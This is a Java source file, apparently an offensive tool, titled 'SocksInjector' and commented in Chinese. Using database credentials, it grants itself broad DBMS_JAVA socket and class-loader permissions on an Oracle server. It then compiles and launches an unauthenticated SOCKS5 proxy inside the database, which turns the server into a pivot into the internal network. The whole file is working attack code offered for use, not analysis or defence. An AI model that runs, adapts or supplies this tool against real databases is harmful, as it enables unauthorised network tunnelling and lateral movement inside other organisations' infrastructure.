package com.demo;

import java.sql.*;
import java.util.Properties;
import java.util.UUID;

public class SocksInjector {
    private final String host;
    private final String port;
    private final String service;
    private final String user;
    private final String password;
    private final String oracleVersion;
    private final boolean sysdbaMode;
    private final boolean isServiceName;
    private Connection persistentConn;
    private final String clientIdentifier;

    public SocksInjector(String host, String port, String service, String user, String password,
                         boolean sysdbaMode, boolean isServiceName) throws SQLException {
        this.host = host;
        this.port = port;
        this.service = service;
        this.user = user;
        this.password = password;
        this.sysdbaMode = sysdbaMode;
        this.isServiceName = isServiceName;
        this.clientIdentifier = "SOCKS5_PROXY_" + UUID.randomUUID();

        Properties props = new Properties();
        props.setProperty("user", user);
        props.setProperty("password", password);
        if (sysdbaMode) {
            props.setProperty("internal_logon", "sysdba");
        }

        String url = buildJdbcUrl("unknown");
        persistentConn = DriverManager.getConnection(url, props);

        // 设置客户端标识符
        try (Statement stmt = persistentConn.createStatement()) {
            String sql = String.format(
                    "BEGIN DBMS_SESSION.SET_IDENTIFIER('%s'); END;",
                    clientIdentifier.replace("'", "''")
            );
            stmt.execute(sql);
        } catch (SQLException e) {
            throw new SQLException("设置客户端标识符失败: " + e.getMessage());
        }

        verifyPrivileges();

        try (Statement stmt = persistentConn.createStatement()) {
            ResultSet rs = stmt.executeQuery("SELECT BANNER FROM v$version");
            oracleVersion = rs.next() ? parseVersion(rs.getString(1)) : "unknown";
        }
    }

    private void verifyPrivileges() throws SQLException {
        try (Statement stmt = persistentConn.createStatement()) {
            if (!checkDBAPrivilege()) {
                throw new SQLException("User lacks ALTER SYSTEM privilege");
            }
            stmt.executeQuery("SELECT 1 FROM v$session WHERE ROWNUM = 1");
        }
    }

    public boolean checkDBAPrivilege() throws SQLException {
        try (Statement stmt = persistentConn.createStatement();
             ResultSet rs = stmt.executeQuery(
                     "SELECT 1 FROM session_privs WHERE privilege = 'ALTER SYSTEM'")) {
            return rs.next();
        }
    }

    public boolean inject(int proxyPort) throws SQLException {
        boolean proxyStarted = false;
        try {
            persistentConn.setAutoCommit(false);
            try {
                grantPermissions(persistentConn, proxyPort);
                createProxyClass(persistentConn);
                createProcedure(persistentConn);
                startProxyService(persistentConn, proxyPort);
                proxyStarted = true;
                persistentConn.commit();
                return true;
            } catch (SQLException e) {
                persistentConn.rollback();
                if (proxyStarted) {
                    return true;
                }
                throw e;
            }
        } finally {
            persistentConn.setAutoCommit(true);
        }
    }

    public boolean stop() {
        try {
            // 改进点1：检查连接状态
            if (persistentConn != null && !persistentConn.isClosed()) {
                boolean success = killProxySession();
                closeResources();
                return success;
            }
            return false; // 连接已关闭无需操作
        } catch (SQLException e) {
            System.err.println("停止失败: " + e.getMessage());
            return false;
        }
    }

    private boolean killProxySession() throws SQLException {
        String query = "SELECT sid, serial# FROM v$session WHERE client_identifier = ?";
        try (PreparedStatement pstmt = persistentConn.prepareStatement(query)) {
            pstmt.setString(1, this.clientIdentifier);
            ResultSet rs = pstmt.executeQuery();

            boolean sessionsKilled = false;
            while (rs.next()) {
                int sid = rs.getInt("sid");
                int serial = rs.getInt("serial#");
                // 改进点2：添加终止会话日志
                System.out.printf("尝试终止会话 SID:%d, SERIAL#:%d%n", sid, serial);
                if (terminateSessionWithRetry(sid, serial)) {
                    sessionsKilled = true;
                }
            }
            return sessionsKilled;
        }
    }

    private boolean terminateSessionWithRetry(int sid, int serial) {
        int maxAttempts = 3;
        int attempts = 0;

        while (attempts < maxAttempts) {
            try {
                if (attemptTermination(sid, serial)) {
                    return true;
                }
            } catch (SQLException ex) {
                // 改进点3：记录详细错误信息
                System.err.printf("终止会话失败 (尝试 %d/%d): %s%n",
                        attempts + 1, maxAttempts, ex.getMessage());
            }

            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return false;
            }
            attempts++;
        }
        return false;
    }

    private boolean attemptTermination(int sid, int serial) throws SQLException {
        String killSQL = String.format(
                "ALTER SYSTEM KILL SESSION '%d,%d' IMMEDIATE",
                sid, serial
        );

        try (Statement stmt = persistentConn.createStatement()) {
            stmt.execute(killSQL);
            return verifySessionTerminated(sid, serial);
        }
    }

    private boolean verifySessionTerminated(int sid, int serial) {
        final String checkSQL = "SELECT 1 FROM v$session WHERE sid = ? AND serial# = ?";
        try (PreparedStatement pstmt = persistentConn.prepareStatement(checkSQL)) {
            pstmt.setInt(1, sid);
            pstmt.setInt(2, serial);
            return !pstmt.executeQuery().next();
        } catch (SQLException e) {
            System.err.println("验证会话状态失败: " + e.getMessage());
            return false;
        }
    }

    private String parseVersion(String banner) {
        if (banner == null) return "unknown";
        String lowerBanner = banner.toLowerCase();
        if (lowerBanner.contains("11g")) return "11g";
        if (lowerBanner.contains("12c")) return "12c";
        if (lowerBanner.contains("19c") || lowerBanner.contains("21c")) return "19c+";
        return "unknown";
    }

    private String buildJdbcUrl(String version) {
        if (version.startsWith("11g")) {
            return String.format("jdbc:oracle:thin:@%s:%s:%s", host, port, service);
        } else {
            return isServiceName ?
                    String.format("jdbc:oracle:thin:@//%s:%s/%s", host, port, service) :
                    String.format("jdbc:oracle:thin:@%s:%s:%s", host, port, service);
        }
    }

    private void grantPermissions(Connection conn, int proxyPort) throws SQLException {
        String safeUser = user.toUpperCase().replace("'", "''");
        String maskedHost = host.replace(".", "\\.");
        String[] permissions = {
                String.format("BEGIN DBMS_JAVA.GRANT_PERMISSION('%s', 'java.net.SocketPermission', '%s:%d', 'listen,accept,resolve'); END;",
                        safeUser, maskedHost, proxyPort),
                String.format("BEGIN DBMS_JAVA.GRANT_PERMISSION('%s', 'java.net.SocketPermission', '*:%d', 'listen,accept,resolve'); END;",
                        safeUser, proxyPort),
                String.format("BEGIN DBMS_JAVA.GRANT_PERMISSION('%s', 'java.net.SocketPermission', '*', 'connect,resolve'); END;", safeUser),
                "BEGIN DBMS_JAVA.GRANT_PERMISSION('" + safeUser + "', 'java.lang.RuntimePermission', 'createClassLoader', ''); END;",
                "BEGIN DBMS_JAVA.GRANT_PERMISSION('" + safeUser + "', 'java.lang.RuntimePermission', 'getClassLoader', ''); END;",
                "BEGIN DBMS_JAVA.GRANT_PERMISSION('" + safeUser + "', 'java.util.PropertyPermission', '*', 'read,write'); END;"
        };

        try (Statement stmt = conn.createStatement()) {
            for (String perm : permissions) {
                stmt.execute(perm);
            }
        }
    }

    private void createProxyClass(Connection conn) throws SQLException {
        String javaCode = generateProxyCode().replace("'", "''")
                .replaceAll("\\s*\\n\\s*", "\n")
                .replaceAll("\\s{2,}", " ");

        String createSQL = "DECLARE\n" +
                "  l_clob CLOB;\n" +
                "BEGIN\n" +
                "  DBMS_LOB.CREATETEMPORARY(l_clob, TRUE);\n" +
                "  DBMS_LOB.WRITEAPPEND(l_clob, LENGTH(?), ?);\n" +
                "  EXECUTE IMMEDIATE 'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED \"OracleSocks5Proxy\" AS ' || l_clob;\n" +
                "  DBMS_LOB.FREETEMPORARY(l_clob);\n" +
                "END;";

        try (PreparedStatement pstmt = conn.prepareStatement(createSQL)) {
            pstmt.setString(1, javaCode);
            pstmt.setString(2, javaCode);
            pstmt.execute();
        }
        checkCompilationStatus(conn);
    }

    private String generateProxyCode() {
        return "import java.io.*;\n" +
                "import java.net.*;\n" +
                "public class OracleSocks5Proxy {\n" +
                "    private static ServerSocket ss;\n" +
                "    private static volatile boolean running = false;\n" +
                "    private static Thread serverThread;\n" +
                "\n" +
                "    public static void start(final int port) throws Exception {\n" +
                "        running = true;\n" +
                "        serverThread = new Thread(new Runnable() {\n" +
                "            public void run() {\n" +
                "                try {\n" +
                "                    ss = new ServerSocket(port);\n" +
                "                    while (running) {\n" +
                "                        try {\n" +
                "                            final Socket client = ss.accept();\n" +
                "                            new Thread(new Runnable() {\n" +
                "                                public void run() {\n" +
                "                                    try {\n" +
                "                                        handleConnection(client);\n" +
                "                                    } catch (Exception e) {\n" +
                "                                        try { client.close(); } catch (Exception ignored) {}\n" +
                "                                    }\n" +
                "                                }\n" +
                "                            }).start();\n" +
                "                        } catch (Exception e) {\n" +
                "                            if (running) {\n" +
                "                                try { Thread.sleep(1000); } catch (InterruptedException ignored) {}\n" +
                "                            }\n" +
                "                        }\n" +
                "                    }\n" +
                "                } catch (Exception e) {\n" +
                "                    if (running) {\n" +
                "                        e.printStackTrace();\n" +
                "                    }\n" +
                "                } finally {\n" +
                "                    try {\n" +
                "                        if (ss != null && !ss.isClosed()) {\n" +
                "                            ss.close();\n" +
                "                        }\n" +
                "                    } catch (IOException e) {\n" +
                "                        e.printStackTrace();\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        }, \"SOCKS-Server\");\n" +
                "        serverThread.start();\n" +
                "    }\n" +
                "\n" +
                "    private static void handleConnection(Socket client) throws Exception {\n" +
                "        if (!running) {\n" +
                "            client.close();\n" +
                "            return;\n" +
                "        }\n" +
                "        DataInputStream in = new DataInputStream(client.getInputStream());\n" +
                "        DataOutputStream out = new DataOutputStream(client.getOutputStream());\n" +
                "\n" +
                "        byte ver = in.readByte();\n" +
                "        if (ver != 0x05) {\n" +
                "            out.write(new byte[]{0x05, (byte)0xFF});\n" +
                "            client.close();\n" +
                "            return;\n" +
                "        }\n" +
                "\n" +
                "        int nmethods = in.readByte();\n" +
                "        byte[] methods = new byte[nmethods];\n" +
                "        in.readFully(methods);\n" +
                "        out.write(new byte[]{0x05, 0x00});\n" +
                "\n" +
                "        ver = in.readByte();\n" +
                "        byte cmd = in.readByte();\n" +
                "        byte rsv = in.readByte();\n" +
                "        byte atyp = in.readByte();\n" +
                "\n" +
                "        InetAddress addr;\n" +
                "        int port;\n" +
                "\n" +
                "        switch(atyp) {\n" +
                "            case 0x01:\n" +
                "                byte[] ipv4 = new byte[4];\n" +
                "                in.readFully(ipv4);\n" +
                "                addr = InetAddress.getByAddress(ipv4);\n" +
                "                break;\n" +
                "            case 0x03:\n" +
                "                int len = in.readByte();\n" +
                "                byte[] domain = new byte[len];\n" +
                "                in.readFully(domain);\n" +
                "                addr = InetAddress.getByName(new String(domain));\n" +
                "                break;\n" +
                "            default:\n" +
                "                throw new Exception(\"Unsupported address type: \" + atyp);\n" +
                "        }\n" +
                "\n" +
                "        port = in.readUnsignedShort();\n" +
                "        Socket target = new Socket();\n" +
                "        target.connect(new InetSocketAddress(addr, port), 10000);\n" +
                "\n" +
                "        byte[] response = new byte[] {\n" +
                "            0x05, 0x00, 0x00, 0x01,\n" +
                "            (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00,\n" +
                "            (byte)(target.getLocalPort() >> 8), (byte)(target.getLocalPort() & 0xFF)\n" +
                "        };\n" +
                "        out.write(response);\n" +
                "\n" +
                "        forward(client.getInputStream(), target.getOutputStream());\n" +
                "        forward(target.getInputStream(), client.getOutputStream());\n" +
                "    }\n" +
                "\n" +
                "    private static void forward(final InputStream input, final OutputStream output) {\n" +
                "        new Thread(new Runnable() {\n" +
                "            public void run() {\n" +
                "                byte[] buffer = new byte[8192];\n" +
                "                try {\n" +
                "                    int len;\n" +
                "                    while (running && (len = input.read(buffer)) != -1) {\n" +
                "                        output.write(buffer, 0, len);\n" +
                "                        output.flush();\n" +
                "                    }\n" +
                "                } catch (Exception e) {\n" +
                "                } finally {\n" +
                "                    try {\n" +
                "                        input.close();\n" +
                "                        output.close();\n" +
                "                    } catch (Exception e) {\n" +
                "                    }\n" +
                "                }\n" +
                "            }\n" +
                "        }).start();\n" +
                "    }\n" +
                "}";
    }

    private void checkCompilationStatus(Connection conn) throws SQLException {
        try (Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT status FROM all_objects WHERE object_name = 'ORACLESOCKS5PROXY'")) {
            if (rs.next() && !"VALID".equals(rs.getString("status"))) {
                throw new SQLException("Java类编译失败: " + getCompilationErrors(conn));
            }
        }
    }

    private String getCompilationErrors(Connection conn) throws SQLException {
        StringBuilder errors = new StringBuilder();
        try (Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery("SELECT line, position, text FROM USER_ERRORS WHERE name = 'ORACLESOCKS5PROXY'")) {
            while (rs.next()) {
                errors.append(String.format("Line %d-%d: %s\n",
                        rs.getInt("line"),
                        rs.getInt("position"),
                        rs.getString("text")));
            }
        }
        return errors.toString();
    }

    private void createProcedure(Connection conn) throws SQLException {
        String createStartProcSQL =
                "CREATE OR REPLACE PROCEDURE start_socks5(port IN NUMBER)\n" +
                        "AS LANGUAGE JAVA\n" +
                        "NAME 'OracleSocks5Proxy.start(int)';";
        executeSQL(conn, createStartProcSQL);
    }

    private void startProxyService(Connection conn, int proxyPort) throws SQLException {
        try (CallableStatement stmt = conn.prepareCall("{call start_socks5(?)}")) {
            stmt.setInt(1, proxyPort);
            stmt.execute();
        } catch (SQLException e) {
            throw new SQLException("代理服务启动失败: " + e.getMessage());
        }
    }

    private void executeSQL(Connection conn, String sql) throws SQLException {
        try (Statement stmt = conn.createStatement()) {
            stmt.execute(sql);
        }
    }

    private void closeResources() {
        try {
            if (persistentConn != null && !persistentConn.isClosed()) {
                persistentConn.close();
            }
        } catch (SQLException e) {
            System.err.println("关闭连接失败: " + e.getMessage());
        }
    }

    public String getHost() {
        return host;
    }

    public String getOracleVersion() {
        return oracleVersion;
    }
}